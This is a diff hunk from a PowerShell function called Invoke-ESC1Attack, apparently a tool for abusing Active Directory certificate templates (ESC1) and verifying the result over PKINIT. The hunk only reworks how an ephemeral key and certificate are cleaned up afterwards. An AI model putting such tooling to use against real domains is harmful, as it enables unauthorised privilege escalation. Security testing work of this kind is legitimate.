@@ -232,23 +232,15 @@ function Invoke-ESC1Attack {
         } catch {
             Write-Warning "PKINIT verification failed: $($_.Exception.Message)"
         } finally {
-            # Clean up the ephemeral machine-store cert + key container created by Request-ESC1Certificate
-            if ($req.Certificate) {
+            # Clean up the ephemeral CNG user key created by Request-ESC1Certificate.
+            # The cert is in-memory only (no store entry to remove).
+            if ($req.RsaKey) {
                 try {
-                    $st = [System.Security.Cryptography.X509Certificates.X509Store]::new('My','LocalMachine')
-                    $st.Open('ReadWrite'); $st.Remove($req.Certificate); $st.Close()
-                } catch { Write-Verbose "Cert store cleanup: $($_.Exception.Message)" }
+                    $key = $req.RsaKey.Key
+                    $req.RsaKey.Dispose()
+                    if ($key) { $key.Delete() }
+                } catch { Write-Verbose "Key cleanup: $($_.Exception.Message)" }
             }
-            if ($req.KeyContainerName) {
-                try {
-                    $csp = [System.Security.Cryptography.CspParameters]::new()
-                    $csp.KeyContainerName = $req.KeyContainerName
-                    $csp.Flags = [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore
-                    $cleanup = [System.Security.Cryptography.RSACryptoServiceProvider]::new($csp)
-                    $cleanup.PersistKeyInCsp = $false; $cleanup.Clear()
-                } catch { Write-Verbose "Key container cleanup: $($_.Exception.Message)" }
-            }
-            if ($req.RsaKey) { $req.RsaKey.Dispose() }
         }
 
         return [PSCustomObject]@{
